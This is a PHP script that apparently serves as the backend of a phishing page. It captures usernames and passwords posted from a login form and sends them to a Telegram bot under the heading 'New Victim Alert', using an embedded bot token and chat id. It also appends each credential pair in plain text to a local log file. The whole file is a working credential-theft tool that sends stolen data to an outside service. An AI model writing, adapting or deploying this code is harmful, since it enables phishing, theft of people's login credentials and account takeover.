<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $token = "7632866238:AAFJGMxkD8p18Z8wxnSvf5snHXJN8ZcK9BQ"; // Replace this
    $chat_id = "1559369377"; // Replace this

    $username = $_POST['username'];
    $password = $_POST['password'];

    $message = "🔥 New Victim Alert 🔥\nUsername: $username\nPassword: $password";

    $url = "https://api.telegram.org/bot$token/sendMessage";

    $data = [
        'chat_id' => $chat_id,
        'text' => $message
    ];

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

    $server_output = curl_exec($ch);
    curl_close($ch);

    // Optional Logging
    file_put_contents("log.txt", "Sent: $username | $password\n", FILE_APPEND);
}
?>
